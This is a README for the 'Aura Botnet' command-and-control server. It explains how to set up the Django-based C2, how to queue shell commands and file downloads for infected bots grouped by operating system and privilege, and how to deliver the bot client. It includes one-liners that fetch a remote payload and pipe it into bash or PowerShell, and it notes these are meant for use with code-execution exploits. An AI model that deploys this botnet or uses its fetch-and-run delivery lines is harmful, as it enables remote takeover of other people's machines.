# Aura Botnet - C2 Server

Getting Started
---
### Docker
The Docker image can be found [here](https://hub.docker.com/r/watersalesman/aura-c2/).
Follow the instructions below to run the server normally.

### From Git
To initialize the SQLite3 database, simply change into the [`aura-server`](../aura-server)
directory and run:
```
./manage.py migrate
```
After the database is initialized, create a superuser for the admin site by
running
```
./manage.py createsuperuser
```
More information on configuring database
and the admin site can be found in the following
[tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial02/)
and [documentation](https://docs.djangoproject.com/en/1.11/ref/databases/).

Finally, run the following to start the server:
```
./runserver.sh
```
[`runserver.sh`](../aura-server/runserver.sh) is just a wrapper around `manage.py runserver` with some default
options that runs the server on port 41450. This can be easily edited or
bypassed altogether.

Configuring Commands
---
These can easily be managed through the Django admin site or shell. The
client periodically communicates with the specified server using POST
requests to receive a command (default is every 5 minutes). Commands are
received as a JSON object specifying the shell to run the command in, file
dependencies, and the command to execute.

Commands can be set to run for specific bot groups defined by operating
system and user privilege.  This is specified in
[`aura-server/groups.json`](../aura-server/groups.json).
The only reserved group numbers are `-1`, for priority commands that are
run by all bots, and `-2`, for default commands that are run by all bots
only if there is no other command to run; you can also assign commands to
individual bots using the hash of their auth file.

Each command can be given a start time and end time. Oneshot commands will
only run once on each bot.

You can also specify file dependencies. These will be retrieved, before
running the command, into the same temporary directory that the command is
executed in. You can specify files on the bot's local filesystem with a file
path or a network file with a url path.

Client Web Delivery
---
The *static* folder can be used to store files to be served by a web server --
preferably an nginx server running on a different port or host as your Django
server. You will need to compile and place the files into the folders, and edit
the index files to reflect any changes like the server name. The simplicity of
executing via web delivery makes it easy to integrate with exploits that run
arbitrary code. An example in bash would be:

```
curl http://static-server-name/welcome/linux/rust | bash
```
In Powershell:
```
Invoke-RestMethod http://static-server-name/welcome/windows/rust | powershell
```

This will run the client with the current privileges, install any necessary
files, and cleanup the downloaded files.
